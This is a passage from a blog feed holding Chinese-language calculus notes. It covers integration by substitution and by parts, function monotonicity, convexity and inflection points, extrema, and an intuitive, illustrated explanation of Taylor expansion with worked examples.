t,-\frac{\pi}{2}&lt;t&lt;\frac{\pi}{2}$，则$\sqrt{a^{2}-x^{2}}=\sqrt{a^{2}-a^{2} \sin ^{2} t}=a \cos t, \mathrm{~d} x=a \cos t \mathrm{~d} t$，于是 根式化成了三角式，所求积分化为</p><p>$\int \sqrt{a^{2}-x^{2}} \mathrm{~d} x=\int a \cos t \cdot a \cos t \mathrm{~d} t=a^{2} \int \cos ^{2} t \mathrm{~d} t$</p><p>由于$\int \cos ^{2} x \mathrm{~d} x=\frac{x}{2}+\frac{\sin 2x}{4}+C$得到下面公式</p><p>$\int \sqrt{a^{2}-x^{2}} \mathrm{~d} x=a^{2}\left(\frac{t}{2}+\frac{\sin 2 t}{4}\right)+C=\frac{a^{2}}{2} t+\frac{a^{2}}{2} \sin t \cos t+C$</p><p>由于$x=a \sin t,-\frac{\pi}{2}&lt;t&lt;\frac{\pi}{2}$所以</p><p>$\begin{align}<br>&amp;t=\arcsin \frac{x}{a}\<br>&amp;\cos t=\sqrt{1-\sin ^{2} t}=\sqrt{1-\left(\frac{x}{a}\right)^{2}}=\frac{\sqrt{a^{2}-x^{2}}}{a}<br>\end{align}$</p><p>于是所求积分为</p><p>$\int \sqrt{a^{2}-x^{2}} \mathrm{~d} x=\frac{a^{2}}{2} \arcsin \frac{x}{a}+\frac{1}{2} x \sqrt{a^{2}-x^{2}}+C$</p><h3 id="分部积分法"><a href="#分部积分法" class="headerlink" title="分部积分法"></a>分部积分法</h3><p>设函数$u=u(x)$和$v=v(x)$具有连续导数，它们的乘积的导数公式为：</p><p>$\begin{align}\int u\mathrm{~d} v=uv-\int v \mathrm{~d} u\end{align}$</p><h4 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h4><p>例题：求$\int x\cos x\mathrm{~d}x$</p><p>如果设$u=x,\mathrm{~d}v=\cos x\mathrm{~d}x$，则$\mathrm{~d}u=\mathrm{~d}x,v=\sin x$，代入分部积分公式得</p><p>$\begin{align}\int x\cos x \mathrm{~d}x=x\sin x-\int \sin x\mathrm{~d}x\end{align}$</p><p>由于$\int v\mathrm{~d}u=\int \sin x \mathrm{~d}x$容易积出，所以</p><p>$\begin{align}\int x \cos x\mathrm{~d}x=x\sin x+\cos x+C\end{align}$</p><hr><p>例题：求$\int x \mathrm{e}^{x} \mathrm{~d} x$</p><p>解：设$u=x, \mathrm{~d} v=\mathrm{e}^{x} \mathrm{~d} x$，则$\mathrm{d} u=\mathrm{d} x, v=\mathrm{e}^{x}$。于是</p><p>$\begin{align}\int x \mathrm{e}^{x} \mathrm{~d} x=x \mathrm{e}^{x}-\int \mathrm{e}^{x} \mathrm{~d} x=x \mathrm{e}^{x}-\mathrm{e}^{x}+C=\mathrm{e}^{x}(x-1)+C\end{align}$</p><p>如果利用分部积分的公司的话，得到如下过程更简单</p><p>$\begin{align}\int x \mathrm{e}^{x} \mathrm{~d} x=\int x \mathrm{~d}\left(\mathrm{e}^{x}\right)=x \mathrm{e}^{x}-\int \mathrm{e}^{x} \mathrm{~d} x \<br>=x \mathrm{e}^{x}-\mathrm{e}^{x}+C=(x-1) \mathrm{e}^{x}+C<br>\end{align}$</p><hr><p>例题：求$\int x^{2} \mathrm{e}^{x} \mathrm{~d} x$</p><p>解：设$u=x^{2}, \mathrm{~d} v=\mathrm{e}^{x} \mathrm{~d} x=\mathrm{d}\left(\mathrm{e}^{x}\right)$，则</p><p>$\int x^{2} \mathrm{e}^{x} \mathrm{~d} x=\int x^{2} \mathrm{~d}\left(\mathrm{e}^{x}\right)=x^{2} \mathrm{e}^{x}-\int \mathrm{e}^{x} \mathrm{~d}\left(x^{2}\right)=x^{2} \mathrm{e}^{x}-2 \int x \mathrm{e}^{x} \mathrm{~d} x$</p><p>这里$\int x \mathrm{e}^{x} \mathrm{~d} x$比$\int x^{2} \mathrm{e}^{x} \mathrm{~d} x$容易积出，因为被积函数中$x$的幂次前者比后者降低了一次。由上一题可知，对$\int x \mathrm{e}^{x} \mathrm{~d} x$再使用一次分部积分法就可以了。于是</p><p>$\begin{align}<br>\int x^{2} \mathrm{e}^{x} \mathrm{~d} x &amp; =x^{2} \mathrm{e}^{x}-2 \int x \mathrm{e}^{x} \mathrm{~d} x=x^{2} \mathrm{e}^{x}-2 \int x \mathrm{~d}\left(\mathrm{e}^{x}\right) \<br>&amp; =x^{2} \mathrm{e}^{x}-2\left(x \mathrm{e}^{x}-\mathrm{e}^{x}\right)+C=\mathrm{e}^{x}\left(x^{2}-2 x+2\right)+C<br>\end{align}$</p><div class="note success modern"><p>总结上面三个例子可以知道，如果被积函数是幂函数和正 (余) 弦函数或幂函数和指数函数的乘积，就可以考虑用分部积分法，并设幂函数为$u$。这样用一 次分部积分法就可以使幂函数的幕次降低一次。这里假定幕指数是正整数。</p></div><hr><p>例题：求$\int x \ln x \mathrm{~d} x$</p><p>解：设$u=\ln x, \mathrm{~d} v=x \mathrm{~d} x$，则</p><p>$\begin{align}<br>\int x \ln x \mathrm{~d} x &amp; =\int \ln x \mathrm{~d} \frac{x^{2}}{2}=\frac{x^{2}}{2} \ln x-\int \frac{x^{2}}{2} \mathrm{~d}(\ln x) \<br>&amp; =\frac{x^{2}}{2} \ln x-\frac{1}{2} \int x \mathrm{~d} x=\frac{x^{2}}{2} \ln x-\frac{x^{2}}{4}+C<br>\end{align}$</p><hr><p>例题：求$\int \arccos x \mathrm{~d} x$</p><p>解：设$u=\arccos x, \mathrm{~d} v=\mathrm{d} x$，则</p><p>$\begin{align}<br>\int \arccos x \mathrm{~d} x &amp; =x \arccos x-\int x \mathrm{~d}(\arccos x) \<br>&amp; =x \arccos x+\int \frac{x}{\sqrt{1-x^{2}}} \mathrm{~d} x \<br>&amp; =x \arccos x-\frac{1}{2} \int \frac{1}{\left(1-x^{2}\right)^{\frac{1}{2}}} \mathrm{~d}\left(1-x^{2}\right) \<br>&amp; =x \arccos x-\sqrt{1-x^{2}}+C<br>\end{align}$</p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="高等数学" scheme="https://www.ascotbe.com/categories/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="高数" scheme="https://www.ascotbe.com/tags/%E9%AB%98%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>函数的单调性、曲线的凹凸性、极值与最大最小值</title>
    <link href="https://www.ascotbe.com/2023/02/27/FurtherMathematics_0x06/"/>
    <id>https://www.ascotbe.com/2023/02/27/FurtherMathematics_0x06/</id>
    <published>2023-02-27T15:58:53.000Z</published>
    <updated>2023-03-08T09:38:33.823Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/0_6.gif" alt="c73eea6933de5f8aa2cf8c316cc08c80" style="zoom:40%;" /></p><h3 id="函数的单调性"><a href="#函数的单调性" class="headerlink" title="函数的单调性"></a>函数的单调性</h3><p>定理：设函数$f(x)$在$\left [a,b \right ]$上连续，$\left (a,b\right)$内可导</p><ul><li>若在$\left (a,b\right)$内${f}’(x)\ge0$且等于0仅在<strong>有限点</strong>处成立，那么$f(x)$在$\left [a,b \right ]$上严格单调增加</li><li>若在$\left (a,b\right)$内${f}’(x)\le 0$且等于0仅在<strong>有限点</strong>处成立，那么$f(x)$在$\left [a,b \right ]$上严格单调减少</li></ul><div class="note success modern"><p>判断函数单调性的步骤</p><ol><li>确定定义域</li><li>求一阶导数，找到驻点（${f}’(x)= 0$的点）和不可导的点</li><li>以这两类点划分定义区间，判断${f}’(x)$在各子区间内的符号，从而确定函数在各子区间的单调性。一般会列表分析</li></ol></div><p>例题：讨论函数$f(x)=\frac{1}{3}x^3+x^2+x+2$的单调性</p><p>解：$f(x)$的定义域为$(-\infty ,+\infty )$，且$f(x)$处处连续，处处可导</p><p>$\begin{align} {f}’(x)=x^2+2x+1=(x+1)^2\ge0\end{align}$</p><p>且$f(x)=0$仅在$x=-1$处取得（驻点），所以$f(x)$在$(-\infty ,+\infty )$上单调增加</p><hr><p>例题：讨论$f(x)=e^x-x-1$的单调性</p><p>解：$f(x)$的定义域为$(-\infty ,+\infty )$，且$f(x)$处处连续，处处可导</p><p>$\begin{align}{f}’(x)=e^x-1\end{align}$</p><p>令${f}’(x)=0$，得到驻点$x=0$。在$(-\infty ,0)$内，${f}’(x)&lt;0$，在$(0,+\infty)$内，${f}’(x)&gt;0$</p><p>所以在$(-\infty,0]$上单调递减，在$[0,+\infty)$上单调递增</p><hr><p>例题：讨论函数$f(x)=3x-x^3$的单调区间</p><p>解：$f(x)$的定义域为$(-\infty ,+\infty )$，且$f(x)$处处连续，处处可导</p><p>$\begin{align}{f}’(x)=3-3x^2\end{align}$</p><p>驻点：$x_1=-1,x_2=1$</p><div class="table-container"><table><thead><tr><th>$x$</th><th>$(-\infty ,-1)$</th><th>-1</th><th>(-1 ,1)</th><th>1</th><th>$(1,+\infty )$</th></tr></thead><tbody><tr><td>${f}’(x)$</td><td>-</td><td>0</td><td>+</td><td>0</td><td>-</td></tr><tr><td>$f(x)$</td><td>$\searrow$</td><td></td><td>$\nearrow$</td><td></td><td>$\searrow$</td></tr></tbody></table></div><p>所以单调递减区间：$(-\infty ,-1)$和$(1,+\infty )$。单调递增区间：$(-1,1)$</p><hr><p>例题：讨论函数$f(x)=\sqrt[3]{x^2}$的单调区间</p><p>解：$f(x)$的定义域为$(-\infty ,+\infty )$，且$f(x)$处处连续</p><p>$\begin{align}{f}’(x)=\frac{2}{3\sqrt[3]{x}}\end{align}$</p><p>$f(x)$在$x=0$处不可导，所以我们就要对函数不可导点左右两边进行研究，在$(-\infty ,0)$内，${f}’(x)&lt;0$，在$(0,+\infty)$内，${f}’(x)&gt;0$</p><p>所以在$(-\infty,0]$上单调递减，在$[0,+\infty)$上单调递增</p><div class="note success modern"><p>${f}’(x)$不存在的点左右两侧单调性可能改变</p></div><h3 id="曲线的凹凸性和拐点"><a href="#曲线的凹凸性和拐点" class="headerlink" title="曲线的凹凸性和拐点"></a>曲线的凹凸性和拐点</h3><h4 id="曲线的凹凸性"><a href="#曲线的凹凸性" class="headerlink" title="曲线的凹凸性"></a>曲线的凹凸性</h4><p>一个函数在上升或下降的过程中，常常会有一个弯曲方向的问题，例如：虽然同为上升函数，但弯曲方向的不同使它们看起来有显著的区别</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/42.png" alt="image-20230226214551020" style="zoom:50%;" /></p><p>上图中弧线ACB是一个上凸的曲线弧，而ADB是一个下凸的曲线弧</p><p>下面给出<strong>曲线凹凸性的定义:</strong><br>设$f(x)$在区间$I$上连续，如果对$I$上任意两点$x_1,x_2$，恒有</p><p>$\begin{align}f(\frac{x_1+x_2}{2})&lt;\frac{f(x_1)+f(x_2)}{2}\end{align}$</p><p>那么称$f(x)$在$I$上的图形是下凸的。如果恒有</p><p>$\begin{align}f(\frac{x_1+x_2}{2})&gt;\frac{f(x_1)+f(x_2)}{2}\end{align}$</p><p>那么称$f(x)$在$I$上的图形是上凸的。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/43.png" alt="image-20230226220714070"></p><p>定理2：设$f(x)$在$[a,b]$上连续，$(a,b)$内可导</p><ol><li>若在$(a,b)$内${f}’’(x)&gt;0$，则$f(x)$的图形在$[a,b]$上是下凸</li><li>若在$(a,b)$内${f}’’(x)&lt;0$，则$f(x)$的图形在$[a,b]$上是上凸</li></ol><blockquote><p>一般用定理2来求解比较方便</p></blockquote><h4 id="拐点"><a href="#拐点" class="headerlink" title="拐点"></a>拐点</h4><p>若连续的曲线上某一点$M(x_0,f(x_0))$的两侧曲线的凹凸性不一致，则称M为曲线的拐点。比如下图函数$y=x^3$中原点就是拐点</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/44.svg" alt="X_cubed_(narrow)"></p><div class="note success modern"><p>求凹凸区间的一般方法：</p><p>设$f(x)$在其定义的区间上连续，且仅有有限个${f}’’(x)=0$和${f}’’(x)$不存在点</p><ol><li>求${f}’’(x)$</li><li>令${f}’’(x)=0$，求其全部解，并求${f}’’(x)$不存在的点；用这些点来把定义区间分为若干部分区间</li><li>在每个部分区间内判断${f}’(x)’$的正负性，从而判定凹凸性</li></ol></div><p>例题：讨论曲线$y=x^2$的凹凸性</p><p>解：定义域为$(-\infty ,+\infty)$</p><p>${y}’=2x ;{y}’’=2$</p><p>因为二阶导数大于 零，所以$y=x^2$的图形在$(-\infty ,+\infty)$内是下凸</p><hr><p>例题：讨论曲线$y=x^3$的凹凸性</p><p>解：定义域为$(-\infty ,+\infty)$</p><p>${y}’=3x^2 ;{y}’’=6x$，令${y}’’=0$得$x=0$</p><p>所以$x&lt;0$时，${y}’’&lt;0$，故$y=x^3$的图形在$(-\infty ,0]$上凸</p><p>所以$x&gt;0$时，${y}’’&gt;0$，故$y=x^3$的图形在$[0,+\infty)$下凸</p><hr><p>例题：讨论曲线$y=x^\frac{5}{3}$的凹凸性</p><p>解：定义域为$(-\infty ,+\infty)$</p><p>${y}’=\frac{5}{3}x^\frac{2}{3} ;{y}’’=\frac{10}{9}x^{-\frac{2}{3}}=\frac{10}{9}\cdot\frac{1}{x^\frac{1}{3}}$，令$x=0$得${y}’’$不存在</p><p>所以$x&lt;0$时，${y}’’&lt;0$，故$y=x^\frac{5}{3}$的图形在$(-\infty ,0]$上凸</p><p>所以$x&gt;0$时，${y}’’&gt;0$，故$y=x^\frac{5}{3}$的图形在$[0,+\infty)$下凸</p><hr><p>例题：讨论曲线$y=3x^4-4x^3+1$，求曲线$y=f(x)$的凹凸区间和拐点</p><p>解：定义域为$(-\infty ,+\infty)$</p><p>${f}’(x)=12x^3-12x^2;{f}’’(x)=36x^2-24x=12x\cdot(3x-2)$，令${f}’’(x)=0$得$x_1=0,x_2=\frac{2}{3}$</p><div class="table-container"><table><thead><tr><th>$x$</th><th>$(-\infty ,0)$</th><th>0</th><th>$(0 ,\frac{2}{3})$</th><th>$\frac{2}{3}$</th><th>$(\frac{2}{3} ,+\infty)$</th></tr></thead><tbody><tr><td>${f}’’(x)$</td><td>+</td><td>0</td><td>-</td><td>0</td><td>+</td></tr><tr><td>$f(x)$</td><td>下凸</td><td>拐点</td><td>上凸</td><td>拐点</td><td>下凸</td></tr></tbody></table></div><p>所以$y=f(x)$图形的下凸区间：$(-\infty ,0],[\frac{2}{3} ,+\infty)$；上凸区间：$[0 ,\frac{2}{3}]$</p><p>拐点（把$x$的值带进到函数中算）：$(0,1),(\frac{2}{3},\frac{11}{27})$</p><h3 id="极值与最大最小值"><a href="#极值与最大最小值" class="headerlink" title="极值与最大最小值"></a>极值与最大最小值</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>设函数$f(x)$在点$x<em>{0}$的某邻域$U\left(x</em>{0}\right)$内有定义, 如果对于去心邻域$\stackrel{\circ}{U}\left(x_{0}\right)$内的任$-x$, 有</p><p>$f(x)<f(x_{0})$或$f(x)>f(x<em>{0})$，那么就称$f\left(x</em>{0}\right)$是函数$f(x)$的一个极大值(或极小值)</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/45.png" alt="image-20230301171431359"></p><p>极大值为：$f(x_2)$、$f(x_5)$</p><p>极小值为：$f(x_1)$、$f(x_4)$、$f(x_6)$</p><p>在区间$[a,b]$中最小值同时也是极小值$f(x_1)$，而最大值$f(b)$不是极值点</p><h4 id="定理"><a href="#定理" class="headerlink" title="定理"></a>定理</h4><p>极值的必要条件：设函数$f(x)$在$x_0$处可导，且$x_0$处取得极值，则${f}’(x_0)=0$</p><p>极值的第一充分条件：设函数$f(x)$在$x<em>0$处连续，且在$x_0$的某去心领域$\stackrel{\circ}{U}(x</em>{0},\delta)$内可导</p><ol><li>若$x \in\left(x<em>{0}-\delta, x</em>{0}\right)$时，$f^{\prime}(x)&gt;0$，而$x \in\left(x<em>{0}, x</em>{0}+\delta\right)$ 时，$f^{\prime}(x)&lt;0$，则$f(x)$在$x_{0}$处取极大值</li><li>若$x \in\left(x<em>{0}-\delta, x</em>{0}\right)$时，$f^{\prime}(x)<0$，而$x \in\left(x_{0}, x_{0}+\delta\right)$时， $f^{\prime}(x)>0$，则$f(x)$在$x_{0}$处取极小值，</li><li>若$x\in \stackrel{\circ}{U}(x<em>0, \delta)$时，$f^{\prime}(x)$的符号保持不变, 则$f(x)$在$x</em>{0}$处没有极值</li></ol><p>极值的第二充分条件：设函数$f(x)$在$x_0$处具有二阶导数且${f}’(x_0)=0$，${f}’’(x_0)\ne 0$，则</p><ol><li>当$f^{\prime \prime}\left(x<em>{0}\right)&lt;0$，函数$f(x)$在$x</em>{0}$处取极大值</li><li>当$f^{\prime \prime}\left(x<em>{0}\right)&gt;0$，函数$f(x)$在$x</em>{0}$处取极小值</li></ol><div class="note success modern"><p>求极值的一般步骤：</p><p>$f(x)$在区间$I$上连续，除有限个点外均可导</p><ol><li>求出导数${f}’(x)$</li><li>令${f}’(x)=0$，求出$f(x)$的全部驻点及不可导点</li><li>用上一点中的点把定义域分成若干个区间，考查各点左右两侧${f}’(x)$的符号，定出极值点</li><li>求出极值</li></ol></div><p>例题：求$f(x)=\frac{1}{3}x^3-\frac{1}{5}x^5$的极值</p><p>解：函数的定义域为$(-\infty ,+\infty]$，</p><p>${f}’(x)=x^2-x^4=x^2 \cdot (1+x)(1-x)$</p><p>驻点：$x_1=-1,x_2=0,x_3=1$</p><div class="table-container"><table><thead><tr><th>$x$</th><th>$(-\infty ,-1)$</th><th>-1</th><th>$(-1 ,0)$</th><th>0</th><th>$(0 ,1)$</th><th>1</th><th>$(1,+\infty)$</th></tr></thead><tbody><tr><td>${f}’(x)$</td><td>-</td><td>0</td><td>+</td><td>0</td><td>+</td><td>0</td><td>-</td></tr><tr><td>$f(x)$</td><td>$\searrow$</td><td>极小值点</td><td>$\nearrow$</td><td>无极值</td><td>$\nearrow$</td><td>极大值点</td><td>$\searrow$</td></tr></tbody></table></div><p>所以极小值点为-1，极大值点为1</p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="高等数学" scheme="https://www.ascotbe.com/categories/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="高数" scheme="https://www.ascotbe.com/tags/%E9%AB%98%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>泰勒展开</title>
    <link href="https://www.ascotbe.com/2023/02/26/FurtherMathematics_0x05/"/>
    <id>https://www.ascotbe.com/2023/02/26/FurtherMathematics_0x05/</id>
    <published>2023-02-26T15:58:53.000Z</published>
    <updated>2023-03-08T09:32:18.469Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/0_5.jpg" style="zoom:50%;" /></p><h2 id="什么是泰勒公式"><a href="#什么是泰勒公式" class="headerlink" title="什么是泰勒公式"></a>什么是泰勒公式</h2><h3 id="基本定义"><a href="#基本定义" class="headerlink" title="基本定义"></a>基本定义</h3><p>泰勒公式一句话描述：就是用多项式函数去逼近光滑函数。</p><p>设$n$是一个正整数。如果定义在一个包含$a$的区间上的函数$f$在$a$点处$n+1$次可导，那么对于这个区间上的任意$x$都有:</p><p>$\begin{align} f(x)= &amp; \sum<em>{n=0}^{\infty} \frac{f^{(n)}(a)}{n !} (x-a)^{n} \&amp;=f(a)+\frac{f^{\prime}(a)}{1 !}(x-a)+\frac{f^{(2)}(a)}{2 !}(x-a)^{2}+\cdots+\frac{f^{(n)}(a)}{n !}(x-a)^{n}+R</em>{n}(x)\end{align}$</p><div class="note success modern"><p>$f^{(n)}(a)$表示$f(x)$在第$n$阶导数的<strong>表达式</strong>，带入一个值$a$计算后<strong>得到的结果</strong>（注意，它是个值）</p><p>$\frac{1}{n!}$是一个系数（一个值），每一项都不同，第一项 $\frac{1}{1!}$，第二项$\frac{1}{2!}$依此类推</p><p>$(x-a)^n$是一个以$x$为自变量的<strong>表达式</strong></p><p>$R_n(x)$是泰勒公式的<strong>余项</strong>，是$(x-a)^n$的高阶无穷小</p></div><h3 id="泰勒级数、泰勒展开、麦克劳伦公式的区别"><a href="#泰勒级数、泰勒展开、麦克劳伦公式的区别" class="headerlink" title="泰勒级数、泰勒展开、麦克劳伦公式的区别"></a>泰勒级数、泰勒展开、麦克劳伦公式的区别</h3><p>以上面的基本定义所示公式作为例子，未展开的公式叫做<strong>泰勒级数</strong>，而展开的叫做<strong>泰勒公式</strong>，为什么呢？因为<strong>泰勒级数</strong>就类比于无限小数，一直写下去，没完没了，所以足够精确，不需要加上$R_{n}(x)$来取代无法继续精确的余项</p><p>打个比喻：我问你圆周率是多少，你告诉我两个答案：第一个答案是$\pi$，第二个答案是3.14+a，其中a=0.0015926585897932384……。在这里，$\pi$就相当于<strong>泰勒级数</strong>，而3.14+a就是<strong>泰勒展开式</strong>，第二个答案中的a就是泰勒展开式中的<strong>余项</strong></p><p>如果$a=0$的话，就是麦克劳伦公式。</p><h2 id="怎样理解泰勒公式"><a href="#怎样理解泰勒公式" class="headerlink" title="怎样理解泰勒公式"></a>怎样理解泰勒公式</h2><p>我们要干的事情，就是<strong>改变</strong>多项式函数$P(x)=c_0+c_1x+c_2x^2$中$c0,c1,c2$的值</p><p>（只有三项是为图个方便）去<strong>近似</strong>余弦函数$f(x)=cos(x)$，【近似过程】参考下面的动图</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/28.gif" alt="近似过程"></p><p>我们需要做的事情（目的）即<strong>寻找一条绿色的曲线</strong>（多项式的系数$c0,c1,c2$），在$x=0$附近（0为上面提到的$a$）尽可能的与$f(x)=cos(x)$的图像<strong>相似</strong>（重合）</p><h3 id="函数式角度"><a href="#函数式角度" class="headerlink" title="函数式角度"></a>函数式角度</h3><p>那如何才能找到这三个参数呢？最为显而易见的做法就是希望在$x=0$的位置，两个表达式的切线尽量相等，切线即斜率，也就是<strong>求导</strong>，比较抽象，一步一步来可视化一下</p><h4 id="近似过程"><a href="#近似过程" class="headerlink" title="近似过程"></a>近似过程</h4><ul><li><p>【确定$c_0$】$x=0$带入公式，令$\cos(x)=1$，同理对$P(x)$可以得到$c_0=1$</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/29.gif" alt="近似过程0"></p></li><li><p>【确定$c1$】容易观察到，如果对$P(x)$求导就可以把$c_1$前的自变量去掉。并且，$x=0$处$P(x)$已经固定为1，为了更进一步的相似，如果我们让$x=0$处的$f(x)$和$P(x)$的切线斜率也相同不就更<strong>近似</strong>了？（两种思考模式我觉得都可以） 求导之后可以的到$c_1=0$</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/30.gif" alt="近似过程1"></p></li><li><p>【确定$c_2$】现在我们<strong>已经</strong>确定两个值，那么绿色曲线就只能如下图一样移动（固定了$x=0$的函数值和$x=0$处的斜率 ），为了更接近<strong>相似</strong>的目标，我们希望<strong>斜率在变化的过程中</strong>，<strong>速度</strong>也是<strong>近似</strong>的（滑动的白色和黄色直线）。求二次导数，斜率的变化率相等，确定$c_2=-\frac{1}{2}$</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/31.gif" alt="近似过程1"></p></li></ul><p>此时得到表达式$P(x)=1-\frac{1}{2}x^2$，检测一下近似度如何？$\cos(0.1)\approx 1-\frac{1}{2}(0.1)^2=0.995$同时计算器 $\cos(0.1)=0.9950042$，其实只取前几项的多项式已经在$x=a$<strong>附近的近似</strong>这一要求上有很好的效果了</p><p>为什么这个【近似过程】写的这么详细，是为了在过程中体会两个关键点</p><h4 id="为什么使用多项式来近似"><a href="#为什么使用多项式来近似" class="headerlink" title="为什么使用多项式来近似"></a>为什么使用多项式来近似</h4><p>因为多项式的求导法则可以控制变量，消去<strong>低次项</strong>，使得$x=a$未知的$c_n$容易确定，在之前的例子里，如下图所示</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/32.gif" alt="近似过程all"></p><p>$c_0$确保了$x=0$时相等，$c_1$确保了$x=0$时的斜率相等，$c_2$确保了$x=0$时斜率的变化率相等，或者说，<strong>随着多项式幂次变高，这种近似就越精确</strong></p><h4 id="为什么有个系数-frac-1-n"><a href="#为什么有个系数-frac-1-n" class="headerlink" title="为什么有个系数$\frac{1}{n!}$"></a>为什么有个系数$\frac{1}{n!}$</h4><p>阶层系数是由一次一次的求导产生的。我们再把项数加两个，参看下图，直观的感受一个$\frac{1}{n!}$的诞生</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/33.gif" alt="近似过程More"></p><p>首先，低次项会变为0，这样可以很方便的通过计算$f(x)$的$n$次求导的表达式，带入$x=a$即可得到$c_n$的值，<strong>阶层其实是多次求导的系数</strong></p><h4 id="函数角度总结"><a href="#函数角度总结" class="headerlink" title="函数角度总结"></a>函数角度总结</h4><ul><li><p>首先，对于$\cos(x)$这个<strong>具体例子</strong>，把$x=0$位置的多阶导数求出，再使用多项式进行近似，使用的项越多，得到的近似就越准确，参看下面动图</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/34.gif" alt="近似过程More"></p></li><li><p>推广到一般函数$f(x)$,下列动图描述了随着项的增加，$x=0$附近的越来越准确</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/35.gif" alt="近似过程More"></p></li><li><p>最后，推广到$x=a$的情形，完全推导出泰勒展开式的一般形式，如下列动图所示</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/36.gif" alt="近似过程More"></p></li></ul><h3 id="几何角度"><a href="#几何角度" class="headerlink" title="几何角度"></a>几何角度</h3><p>首先定义一个函数表示<strong>求下列图像中函数图像中填满部分的面积</strong>，函数为$f(x)$，面积函数为 $f<em>{area}(x)$，而围成面积区域的曲线即为面积函数的导数$\frac{\mathrm{~d}f</em>{area}}{\mathrm{~d}x}(x)$（至于为什么是这样，有一个牛逼的名字叫做，微积分基本定理： $\int_{a}^{b} f(t)\mathrm{~d}t=F(b)-F(a)$，如下图所示</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/37.png" alt="几何解释"></p><p>定义一个这样的场景是为了计算这样一件事（如下图所示）：假设我们知道了$f(a)$点的面积，往右扩展很小的距离$\mathrm{~d}x$要算出<strong>新部分的面积</strong>（左边绿色已知 + 黄色矩形 + 红色三角形），公式会是什么样的呢？</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/38.png" alt="几何解释问题"></p><p>设$\mathrm{~d}t$开始点为$a$，终点为$x$，则可以得到</p><ul><li><p>【黄色矩形】底边为$x-a$；高为$\frac{\mathrm{~d}f_{area}}{\mathrm{~d}x}(a)$；</p></li><li><p>【红色三角形】底边为$x-a$；高的计算稍微麻烦，首先，斜边的斜率是$\frac{\mathrm{~d}f<em>{area}}{\mathrm{~d}x}(x)$ <strong>函数的导数</strong>在$x=a$时的函数值（算斜率，求导数即可），而斜率$k=\frac{y}{x}$，所以得到高为 $\frac{\mathrm{~d}f</em>{area}}{\mathrm{~d}x^2}(a)(x-a)$（前部分是斜率，后半部分是$x$，需要求的是$y$也是高）</p></li><li><p>【计算总面积】如下图和公式所示</p><p>$\begin{align}<br>f<em>{\text {area }}(x) \approx f(a)+\frac{d f</em>{\text {area }}}{d x}(a)(x-a)+\frac{1}{2} \frac{d^{2} f_{\text {area }}}{d x^{2}}(a)(x-a)^{2}<br>\end{align}$</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/39.png" alt="几何解释问题"></p></li></ul><p>这个公式为啥这么眼熟呢？其实明显就是泰勒展开式的前3项，如果你还要打破沙锅问到底，第4项呢？你可以放大红色三角形，把函数曲线和面积之间的空白部分再次用多个更小的三角形填补，在积分工具的帮助下，可以得到三次项</p><p>从几何角度来看，再一次验证了，泰勒公式是近似的$x=a$附近的函数值这一直观理解</p><h3 id="余项"><a href="#余项" class="headerlink" title="余项"></a>余项</h3><p>我们知道，对<strong>泰勒公式</strong>来说，并没有办法完全逼近待求函数，所以无论如何到最后都会留一点东西，这剩下的东西不好表达，就<strong>全都丢到余项中</strong></p><h2 id="泰勒级数"><a href="#泰勒级数" class="headerlink" title="泰勒级数"></a>泰勒级数</h2><p>完成对【泰勒公式】的理解后，需要对【级数 Series】这个概念进行一个推广，什么是【级数】呢？</p><p>在数学中，【级数】就是<strong>无限多项的和</strong></p><p>在把泰勒展开式，扩展到无限项之后，就会出现【收敛 Converge】和【发散 diverge】的概念</p><h3 id="收敛"><a href="#收敛" class="headerlink" title="收敛"></a>收敛</h3><p>收敛，即在泰勒展开式被推广到无限项之后，整体式子的值会越来越趋近于一个定值，比如下图的$\frac{1}{2}$和$e$</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/40.gif" alt="几何解释问题"></p><h3 id="发散"><a href="#发散" class="headerlink" title="发散"></a>发散</h3><p>与收敛相对应的，即发散，式子无法趋近于一个定值，比如$ln(x)$在$x=1$附近，如下图所示，虚线即为能够让多项式的和收敛的最大取之范围，称为【泰勒级数的<strong>收敛半径</strong>】</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/41.gif" alt="几何解释问题"></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>用一张霉霉的图作为结尾</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/0_5_1.jpg" alt="1"></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
